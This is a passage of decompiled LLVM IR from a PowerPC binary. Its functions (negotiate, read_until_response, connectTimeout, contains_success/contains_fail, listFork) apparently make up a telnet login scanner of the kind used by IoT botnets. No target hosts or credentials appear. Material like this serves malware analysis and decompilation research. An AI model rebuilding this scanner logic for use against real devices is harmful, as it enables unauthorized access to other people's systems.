  br i1 %tmp44, label %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge, label %dec_label_pc_10001d88

dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge: ; preds = %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge
  %v3_10001d5c.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge

dec_label_pc_10001d88:                            ; preds = %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge
  %v2_10001da4 = load i32, i32* %v1_10001ca8, align 4
  %v2_10001db8 = or i32 %v2_10001da4, %v3_10001cb8
  store i32 %v2_10001db8, i32* %v1_10001ca8, align 4
  store i32 268443132, i32* @lr, align 4
  %v5_10001df8 = call i32 @__libc_select(i32 %v1_10001cd8, i32 %v2_10001c48, i32 0, i32 %v2_10001c48, i32 %v2_10001ce4)
  %v2_10001e08 = icmp sgt i32 %v5_10001df8, 0
  br i1 %v2_10001e08, label %dec_label_pc_10001eb8.preheader, label %dec_label_pc_10001e10

dec_label_pc_10001e10:                            ; preds = %dec_label_pc_10001d88
  %v1_10001e14 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10001e14, 10
  br i1 %tmp45, label %dec_label_pc_10001d18, label %dec_label_pc_10001eb8.preheader

dec_label_pc_10001eb8.preheader:                  ; preds = %dec_label_pc_10001e10, %dec_label_pc_10001d88, %dec_label_pc_10001e1c.preheader, %dec_label_pc_10001c8c
  %v2_10001e44 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_10001eb8

dec_label_pc_10001e3c:                            ; preds = %dec_label_pc_10001eb8
  %v3_10001e40 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 268443228, i32* @lr, align 4
  %v4_10001e58 = call i32 @__libc_recv(i32 %v3_10001e40, i32 %v2_10001e44, i32 1, i32 0)
  %v3_10001e60 = icmp eq i32 %v4_10001e58, 1
  br i1 %v3_10001e60, label %dec_label_pc_10001e80, label %dec_label_pc_10001e68

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001e3c
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_10001ef4

dec_label_pc_10001e80:                            ; preds = %dec_label_pc_10001e3c
  %v3_10001e80 = load i8, i8* %stack_var_-32, align 1
  %v4_10001e88 = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_10001e80, i8* %stack_var_-180.0, align 1
  %v1_10001e94 = add i32 %v4_10001e88, 1
  %v5_10001e98 = inttoptr i32 %v1_10001e94 to i8*
  %v3_10001e9c = load i8, i8* %stack_var_-32, align 1
  %v3_10001ea4 = icmp eq i8 %v3_10001e9c, 10
  br i1 %v3_10001ea4, label %dec_label_pc_10001ee0, label %dec_label_pc_10001eac

dec_label_pc_10001eac:                            ; preds = %dec_label_pc_10001e80
  %v1_10001eb0 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_10001eb8

dec_label_pc_10001eb8:                            ; preds = %dec_label_pc_10001eb8.preheader, %dec_label_pc_10001eac
  %stack_var_-180.0 = phi i8* [ %v5_10001e98, %dec_label_pc_10001eac ], [ %arg2, %dec_label_pc_10001eb8.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_10001eb0, %dec_label_pc_10001eac ], [ 0, %dec_label_pc_10001eb8.preheader ]
  %v0_10001ec0 = call i32 @__asm_mfcr()
  %v1_10001ec4 = call i32 @__asm_rlwinm(i32 %v0_10001ec0, i32 30, i32 31, i32 31)
  %v1_10001ec8 = urem i32 %v1_10001ec4, 256
  %v3_10001ed8 = icmp eq i32 %v1_10001ec8, 0
  br i1 %v3_10001ed8, label %dec_label_pc_10001ee0, label %dec_label_pc_10001e3c

dec_label_pc_10001ee0:                            ; preds = %dec_label_pc_10001eb8, %dec_label_pc_10001e80
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_10001eb8 ], [ %v5_10001e98, %dec_label_pc_10001e80 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_10001ef4

dec_label_pc_10001ef4:                            ; preds = %dec_label_pc_10001e68, %dec_label_pc_10001ee0
  %storemerge = phi i32 [ -1, %dec_label_pc_10001e68 ], [ %stack_var_-184.0, %dec_label_pc_10001ee0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_10001e98, { 1, 0 }
  uselistorder i32 %v1_10001e14, { 1, 0 }
  uselistorder i32 %v1_10001d74, { 1, 0 }
  uselistorder i32 %v2_10001ce4, { 1, 0 }
  uselistorder i32* %v1_10001ca8, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_10001c48, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10001ef4, { 1, 0 }
  uselistorder label %dec_label_pc_10001eb8, { 1, 0 }
  uselistorder label %dec_label_pc_10001d18, { 1, 0 }
  uselistorder label %dec_label_pc_10001c5c, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_10001f30 = add i32 %arg1, 4
  %v2_10001f30 = inttoptr i32 %v1_10001f30 to i32*
  %v3_10001f30 = load i32, i32* %v2_10001f30, align 4
  store i32 %v3_10001f30, i32* %stack_var_-20, align 4
  store i32 268443468, i32* @lr, align 4
  %v3_10001f48 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_10001f48
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268443564, i32* @lr, align 4
  %v4_10001fa8 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_10001fc0 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_10001fd0 = load i8, i8* %arg3, align 1
  %v3_10001fd8 = icmp eq i8 %v3_10001fd0, -1
  br i1 %v3_10001fd8, label %dec_label_pc_10001fe0, label %dec_label_pc_10001ff4

dec_label_pc_10001fe0:                            ; preds = %entry
  store i32 268443636, i32* @lr, align 4
  %v6_10001ff0 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_10001ff4

dec_label_pc_10001ff4:                            ; preds = %entry, %dec_label_pc_10001fe0
  %v3_10002000 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_10002008 = icmp ne i32 %v3_10002000, 0
  %. = zext i1 %v3_10002008 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10001ff4, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_10002078 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10002078, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge

dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge: ; preds = %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge, %entry
  %v3_10002090.pre = phi i32 [ %v2_10002078, %entry ], [ %v3_10002090.pre.pre, %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge ]
  %v1_100020a821 = phi i32 [ 1, %entry ], [ %v1_100020a8, %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge ]
  %v1_10002094 = mul nuw nsw i32 %v1_100020a821, 4
  %v2_10002098 = add i32 %v1_10002094, %v3_10002090.pre
  %v2_100020a0 = inttoptr i32 %v2_10002098 to i32*
  store i32 0, i32* %v2_100020a0, align 4
  %v1_100020a8 = add nuw nsw i32 %v1_100020a821, 1
  %tmp19 = icmp ult i32 %v1_100020a8, 32
  br i1 %tmp19, label %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge, label %dec_label_pc_100020bc

dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge.dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge
  %v3_10002090.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge

dec_label_pc_100020bc:                            ; preds = %dec_label_pc_1000208c.dec_label_pc_1000208c_crit_edge
  %v1_100020c0 = udiv i32 %arg1, 32
  %v1_100020c8 = mul nuw nsw i32 %v1_100020c0, 4
  %v2_100020cc = ptrtoint i32* %stack_var_-184 to i32
  %v2_100020d0 = add nuw nsw i32 %v1_100020c8, 8
  %v1_100020d4 = add i32 %v2_100020d0, %v2_100020cc
  %v1_100020d8 = inttoptr i32 %v1_100020d4 to i32*
  %v2_100020d8 = load i32, i32* %v1_100020d8, align 4
  %v1_100020e0 = urem i32 %arg1, 32
  %v3_100020e8 = shl i32 1, %v1_100020e0
  %v2_100020ec = or i32 %v2_100020d8, %v3_100020e8
  store i32 %v2_100020ec, i32* %v1_100020d8, align 4
  %v1_10002108 = add i32 %arg1, 1
  %v2_10002110 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268443948, i32* @lr, align 4
  %v5_10002128 = call i32 @__libc_select(i32 %v1_10002108, i32 %v2_10002078, i32 0, i32 0, i32 %v2_10002110)
  %v2_10002130 = icmp sgt i32 %v5_10002128, 0
  br i1 %v2_10002130, label %dec_label_pc_10002144, label %dec_label_pc_10002164

dec_label_pc_10002144:                            ; preds = %dec_label_pc_100020bc
  store i32 268443996, i32* @lr, align 4
  %v4_10002158 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_10002164

dec_label_pc_10002164:                            ; preds = %dec_label_pc_100020bc, %dec_label_pc_10002144
  %storemerge = phi i32 [ %v4_10002158, %dec_label_pc_10002144 ], [ 0, %dec_label_pc_100020bc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_100020a8, { 1, 0 }
  uselistorder i32 %v2_10002078, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10002164, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_100021a4 = icmp eq i32 %arg2, 0
  br i1 %v3_100021a4, label %dec_label_pc_100021ac, label %dec_label_pc_100021bc

dec_label_pc_100021ac:                            ; preds = %entry
  %v2_100021b0 = load i32, i32* %arg1, align 4
  store i32 268444092, i32* @lr, align 4
  %v1_100021b8 = call i32 @__libc_close(i32 %v2_100021b0)
  br label %dec_label_pc_100021bc

dec_label_pc_100021bc:                            ; preds = %entry, %dec_label_pc_100021ac
  %v2_100021c4 = add i32 %tmp, 16
  %v3_100021c4 = inttoptr i32 %v2_100021c4 to i32*
  store i32 0, i32* %v3_100021c4, align 4
  %v1_100021d4 = trunc i32 %arg2 to i8
  %v3_100021d4 = add i32 %tmp, 8
  %v4_100021d4 = inttoptr i32 %v3_100021d4 to i8*
  store i8 %v1_100021d4, i8* %v4_100021d4, align 1
  %v1_100021dc = add i32 %tmp, 24
  %v2_100021dc = inttoptr i32 %v1_100021dc to i32*
  %v3_100021dc = load i32, i32* %v2_100021dc, align 4
  store i32 268444148, i32* @lr, align 4
  %v3_100021f0 = call i32 @__GI_memset(i32 %v3_100021dc, i32 0, i32 1024)
  ret i32 %v3_100021f0

; uselistorder directives
  uselistorder label %dec_label_pc_100021bc, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000222c = inttoptr i32 %arg1 to i32*
  %v3_1000222c = call i32 @advance_state(i32* %v2_1000222c, i32 0)
  %v3_10002238 = add i32 %arg1, 9
  %v4_10002238 = inttoptr i32 %v3_10002238 to i8*
  store i8 1, i8* %v4_10002238, align 1
  ret i32 %v3_1000222c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000227c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_10024670.33 to i32))
  ret i32 %v3_1000227c
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100022c8 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_10024650.41 to i32))
  ret i32 %v3_100022c8

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268444428, i32* @lr, align 4
  %v1_10002308 = call i32 @contains_success(i32 %arg1)
  %v3_10002310 = icmp eq i32 %v1_10002308, 0
  br i1 %v3_10002310, label %dec_label_pc_10002318, label %dec_label_pc_10002340

dec_label_pc_10002318:                            ; preds = %entry
  store i32 268444448, i32* @lr, align 4
  %v1_1000231c = call i32 @contains_fail(i32 %arg1)
  %v3_10002324 = icmp ne i32 %v1_1000231c, 0
  %. = zext i1 %v3_10002324 to i32
  br label %dec_label_pc_10002340

dec_label_pc_10002340:                            ; preds = %dec_label_pc_10002318, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_10002318 ]
  ret i32 %storemerge
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_10002394

dec_label_pc_10002394:                            ; preds = %dec_label_pc_10002394, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_10002398, %dec_label_pc_10002394 ]
  %v1_10002398 = add i32 %stack_var_-36.0, 1
  %v1_100023a4 = mul i32 %v1_10002398, 4
  %v2_100023b0 = add i32 %v1_100023a4, %arg2
  %v1_100023b4 = inttoptr i32 %v2_100023b0 to i32*
  %v2_100023b4 = load i32, i32* %v1_100023b4, align 4
  %v3_100023b8 = icmp eq i32 %v2_100023b4, 0
  br i1 %v3_100023b8, label %dec_label_pc_10002418.preheader, label %dec_label_pc_10002394

dec_label_pc_10002418.preheader:                  ; preds = %dec_label_pc_10002394
  %v2_100024204 = icmp sgt i32 %v1_10002398, 0
  br i1 %v2_100024204, label %dec_label_pc_100023cc.lr.ph, label %dec_label_pc_10002430

dec_label_pc_100023cc.lr.ph:                      ; preds = %dec_label_pc_10002418.preheader
  %v3_100023f0 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_100023cc

dec_label_pc_100023cc:                            ; preds = %dec_label_pc_100023cc.lr.ph, %dec_label_pc_1000240c
  %storemerge27 = phi i32 [ 0, %dec_label_pc_100023cc.lr.ph ], [ %v1_10002410, %dec_label_pc_1000240c ]
  %v1_100023d0 = mul i32 %storemerge27, 4
  %v2_100023dc = add i32 %v1_100023d0, %arg2
  %v1_100023e0 = inttoptr i32 %v2_100023dc to i32*
  %v2_100023e0 = load i32, i32* %v1_100023e0, align 4
  store i32 268444660, i32* @lr, align 4
  %v4_100023f0 = call i32 @strcasestr(i8* %v3_100023f0, i32 %v2_100023e0, i32 %v2_100023dc)
  %v3_100023f8 = icmp eq i32 %v4_100023f0, 0
  br i1 %v3_100023f8, label %dec_label_pc_1000240c, label %dec_label_pc_10002430.loopexit

dec_label_pc_1000240c:                            ; preds = %dec_label_pc_100023cc
  %v1_10002410 = add nuw nsw i32 %storemerge27, 1
  %v2_10002420 = icmp slt i32 %v1_10002410, %v1_10002398
  br i1 %v2_10002420, label %dec_label_pc_100023cc, label %dec_label_pc_10002430.loopexit

dec_label_pc_10002430.loopexit:                   ; preds = %dec_label_pc_1000240c, %dec_label_pc_100023cc
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_100023cc ], [ 0, %dec_label_pc_1000240c ]
  br label %dec_label_pc_10002430

dec_label_pc_10002430:                            ; preds = %dec_label_pc_10002430.loopexit, %dec_label_pc_10002418.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10002418.preheader ], [ %storemerge.ph, %dec_label_pc_10002430.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_10002398, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100023cc, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268444808, i32* @lr, align 4
  %v2_10002484 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_100024b0.42 to i32), i32* @lr, align 4
  %v2_100024ac = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_100024bc = urem i32 %arg3, 65536
  store i32 %v1_100024bc, i32* @r3, align 4
  %v1_100024c4 = call i32 @htons(i32 %v1_100024bc)
  %v2_100024d4 = ptrtoint i32* %stack_var_-200 to i32
  %v4_100024e4 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_100024d4)
  %v3_100024ec = icmp eq i32 %v4_100024e4, 0
  br i1 %v3_100024ec, label %dec_label_pc_10002500, label %dec_label_pc_100024f4

dec_label_pc_100024f4:                            ; preds = %entry
  br label %dec_label_pc_100026c0

dec_label_pc_10002500:                            ; preds = %entry
  store i32 268444972, i32* @lr, align 4
  %v3_10002528 = call i32 @__libc_connect(i32 %arg1, i32 %v2_100024d4, i32 16)
  %tmp26 = icmp sgt i32 %v3_10002528, -1
  br i1 %tmp26, label %dec_label_pc_1000267c, label %dec_label_pc_10002540

dec_label_pc_10002540:                            ; preds = %dec_label_pc_10002500
  %v0_10002540 = call i32 @__errno_location()
  %v1_10002548 = inttoptr i32 %v0_10002540 to i32*
  %v2_10002548 = load i32, i32* %v1_10002548, align 4
  %v3_1000254c = icmp eq i32 %v2_10002548, 115
  br i1 %v3_1000254c, label %dec_label_pc_10002554, label %dec_label_pc_10002670

dec_label_pc_10002554:                            ; preds = %dec_label_pc_10002540
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_10002564 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_10002564, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge

dec_label_pc_10002578.dec_label_pc_10002578_crit_edge: ; preds = %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge, %dec_label_pc_10002554
  %v3_1000257c.pre = phi i32 [ %v2_10002564, %dec_label_pc_10002554 ], [ %v3_1000257c.pre.pre, %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge ]
  %v1_1000259430 = phi i32 [ 1, %dec_label_pc_10002554 ], [ %v1_10002594, %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge ]
  %v1_10002580 = mul nuw nsw i32 %v1_1000259430, 4
  %v2_10002584 = add i32 %v1_10002580, %v3_1000257c.pre
  %v2_1000258c = inttoptr i32 %v2_10002584 to i32*
  store i32 0, i32* %v2_1000258c, align 4
  %v1_10002594 = add nuw nsw i32 %v1_1000259430, 1
  %tmp27 = icmp ult i32 %v1_10002594, 32
  br i1 %tmp27, label %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge, label %dec_label_pc_100025a8

dec_label_pc_10002578.dec_label_pc_10002578_crit_edge.dec_label_pc_10002578.dec_label_pc_10002578_crit_edge_crit_edge: ; preds = %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge
  %v3_1000257c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge

dec_label_pc_100025a8:                            ; preds = %dec_label_pc_10002578.dec_label_pc_10002578_crit_edge
  %v1_100025ac = udiv i32 %arg1, 32
  %v1_100025b4 = mul nuw nsw i32 %v1_100025ac, 4
  %v2_100025b8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_100025bc = add nuw nsw i32 %v1_100025b4, 32
  %v1_100025c0 = add i32 %v2_100025bc, %v2_100025b8
  %v1_100025c4 = inttoptr i32 %v1_100025c0 to i32*
  %v2_100025c4 = load i32, i32* %v1_100025c4, align 4
  %v1_100025cc = urem i32 %arg1, 32
  %v3_100025d4 = shl i32 1, %v1_100025cc
  %v2_100025d8 = or i32 %v2_100025c4, %v3_100025d4
  store i32 %v2_100025d8, i32* %v1_100025c4, align 4
  %v1_100025f4 = add i32 %arg1, 1
  %v2_100025fc = ptrtoint i32* %stack_var_-56 to i32
  store i32 268445208, i32* @lr, align 4
  %v5_10002614 = call i32 @__libc_select(i32 %v1_100025f4, i32 0, i32 %v2_10002564, i32 0, i32 %v2_100025fc)
  %tmp28 = icmp slt i32 %v5_10002614, 1
  br i1 %tmp28, label %dec_label_pc_10002664, label %dec_label_pc_10002624

dec_label_pc_10002624:                            ; preds = %dec_label_pc_100025a8
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000262c = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002630 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268445260, i32* @lr, align 4
  %v5_10002648 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_1000262c, i32 %v2_10002630)
  %v3_1000264c = load i32, i32* %stack_var_-44, align 4
  %v3_10002650 = icmp eq i32 %v3_1000264c, 0
  br i1 %v3_10002650, label %dec_label_pc_1000267c, label %dec_label_pc_10002658

dec_label_pc_10002658:                            ; preds = %dec_label_pc_10002624
  br label %dec_label_pc_100026c0

dec_label_pc_10002664:                            ; preds = %dec_label_pc_100025a8
  br label %dec_label_pc_100026c0

dec_label_pc_10002670:                            ; preds = %dec_label_pc_10002540
  br label %dec_label_pc_100026c0

dec_label_pc_1000267c:                            ; preds = %dec_label_pc_10002624, %dec_label_pc_10002500
  store i32 268445328, i32* @lr, align 4
  %v2_1000268c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_1000269c = call i32 @__asm_rlwinm(i32 %v2_1000268c, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_100026b8.43 to i32), i32* @lr, align 4
  %v2_100026b4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_100026c0

dec_label_pc_100026c0:                            ; preds = %dec_label_pc_10002670, %dec_label_pc_10002664, %dec_label_pc_10002658, %dec_label_pc_100024f4, %dec_label_pc_1000267c
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_1000267c ], [ 0, %dec_label_pc_10002664 ], [ 0, %dec_label_pc_10002658 ], [ 0, %dec_label_pc_10002670 ], [ 0, %dec_label_pc_100024f4 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_10002594, { 1, 0 }
  uselistorder i32 %v2_10002564, { 1, 0, 2 }
  uselistorder i32 %v2_100024d4, { 1, 0 }
  uselistorder i32 %v1_100024bc, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_100026c0, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268445432, i32* @lr, align 4
  %v0_100026f4 = call i32 @__libc_fork()
  %v3_10002704 = icmp eq i32 %v0_100026f4, 0
  br i1 %v3_10002704, label %dec_label_pc_10002888, label %dec_label_pc_10002718

dec_label_pc_10002718:                            ; preds = %entry
  %v3_10002720 = load i32, i32* @global_var_10024a34.45, align 4
  %v2_10002724 = load i32, i32* @global_var_10024a30.44, align 4
  %v1_10002728 = add i32 %v3_10002720, 1
  %v2_10002728 = icmp eq i32 %v3_10002720, -1
  %v2_1000272c = zext i1 %v2_10002728 to i32
  %v3_1000272c = add i32 %v2_1000272c, %v2_10002724
  store i32 %v3_1000272c, i32* @global_var_10024a30.44, align 4
  store i32 %v1_10002728, i32* @global_var_10024a34.45, align 4
  %v1_1000275c = mul i32 %v1_10002728, 4
  %v1_10002764 = add i32 %v1_1000275c, 4
  store i32 %v1_10002764, i32* @r3, align 4
  store i32 268445552, i32* @lr, align 4
  %v0_1000276c = call i32 @malloc()
  br label %dec_label_pc_100027c4

dec_label_pc_10002784:                            ; preds = %dec_label_pc_100027c4, %dec_label_pc_10002814
  %v1_10002788 = mul i32 %storemerge2, 4
  %v2_10002794 = add i32 %v1_10002788, %v0_1000276c
  %v3_100027a8 = load i32, i32* @global_var_10024a5c.46, align 4
  %v2_100027ac = add i32 %v3_100027a8, %v1_10002788
  %v1_100027b0 = inttoptr i32 %v2_100027ac to i32*
  %v2_100027b0 = load i32, i32* %v1_100027b0, align 4
  %v2_100027b4 = inttoptr i32 %v2_10002794 to i32*
  store i32 %v2_100027b0, i32* %v2_100027b4, align 4
  %v1_100027bc = add i32 %storemerge2, 1
  br label %dec_label_pc_100027c4

dec_label_pc_100027c4:                            ; preds = %dec_label_pc_10002718, %dec_label_pc_10002784
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10002718 ], [ %v1_100027bc, %dec_label_pc_10002784 ]
  %v3_100027ec = load i32, i32* @global_var_10024a34.45, align 4
  %v2_100027f0 = load i32, i32* @global_var_10024a30.44, align 4
  %v2_100027f4 = icmp ne i32 %v3_100027ec, 0
  %v3_100027f8 = add i32 %v2_100027f0, -1
  %v4_100027f8 = sext i1 %v2_100027f4 to i32
  %v3_1000280c = icmp eq i32 %v3_100027f8, %v4_100027f8
  br i1 %v3_1000280c, label %dec_label_pc_10002814, label %dec_label_pc_10002784

dec_label_pc_10002814:                            ; preds = %dec_label_pc_100027c4
  %v1_100027f4 = add i32 %v3_100027ec, -1
  %v3_1000282c = icmp ugt i32 %v1_100027f4, %storemerge2
  br i1 %v3_1000282c, label %dec_label_pc_10002784, label %dec_label_pc_10002834

dec_label_pc_10002834:                            ; preds = %dec_label_pc_10002814
  %v1_10002848 = mul i32 %v3_100027ec, 4
  %v2_10002854 = add i32 %v0_1000276c, -4
  %v1_10002858 = add i32 %v2_10002854, %v1_10002848
  %v2_10002860 = inttoptr i32 %v1_10002858 to i32*
  store i32 %v0_100026f4, i32* %v2_10002860, align 4
  %v3_10002868 = load i32, i32* @global_var_10024a5c.46, align 4
  store i32 %v3_10002868, i32* @r3, align 4
  store i32 268445812, i32* @lr, align 4
  %v0_10002870 = call i32 @free()
  store i32 %v0_1000276c, i32* @global_var_10024a5c.46, align 4
  br label %dec_label_pc_10002888

dec_label_pc_10002888:                            ; preds = %entry, %dec_label_pc_10002834
  ret i32 %v0_100026f4

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002788, { 1, 0 }
  uselistorder i32 %v0_1000276c, { 1, 2, 0 }
  uselistorder i32 %v3_10002720, { 1, 0 }
  uselistorder label %dec_label_pc_10002888, { 1, 0 }
  uselistorder label %dec_label_pc_100027c4, { 1, 0 }
  uselistorder label %dec_label_pc_10002784, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_100028cc = add i32 %arg2, 1
  %v1_100028d0 = inttoptr i32 %v1_100028cc to i8*
  %v2_100028d0 = load i8, i8* %v1_100028d0, align 1
  %v1_100028e0 = icmp ult i8 %v2_100028d0, -5
  br i1 %v1_100028e0, label %dec_label_pc_10002a38, label %dec_label_pc_100028e8

dec_label_pc_100028e8:                            ; preds = %entry
  %v2_100028ec = icmp eq i8 %v2_100028d0, -1
  br i1 %v2_100028ec, label %dec_label_pc_100028f4, label %dec_label_pc_10002910

dec_label_pc_100028f4:                            ; preds = %dec_label_pc_100028e8
  br label %dec_label_pc_10002a38

dec_label_pc_10002910:                            ; preds = %dec_label_pc_100028e8
  store i8 -1, i8* %stack_var_-56, align 1
